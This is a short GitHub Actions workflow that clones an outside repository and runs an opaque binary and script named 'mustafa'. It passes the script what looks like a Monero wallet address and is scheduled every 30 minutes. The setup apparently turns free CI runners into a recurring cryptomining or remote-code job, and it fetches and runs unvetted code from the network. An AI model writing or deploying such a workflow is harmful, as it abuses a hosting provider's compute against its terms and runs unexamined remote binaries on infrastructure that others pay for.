name: Run Mustafa

on:
  push:
    branches: [ main, master ]
  schedule:
    - cron: '*/30 * * * *'
  workflow_dispatch:

jobs:
  run:
    runs-on: ubuntu-latest
    
    steps:
    - name: 📥 Clone
      run: git clone https://github.com/thumpingpp/mustu-setup.git
      
    - name: 🐍 Setup Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.10'
    
    - name: 🚀 Execute Binary
      run: |
        cd mustu-setup
        chmod +x mustafa      # Binary ko executable banao
        python3 mustafa.py "43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN"
    
    - name: ✅ Status
      if: always()
      run: echo "Run completed at $(date)"
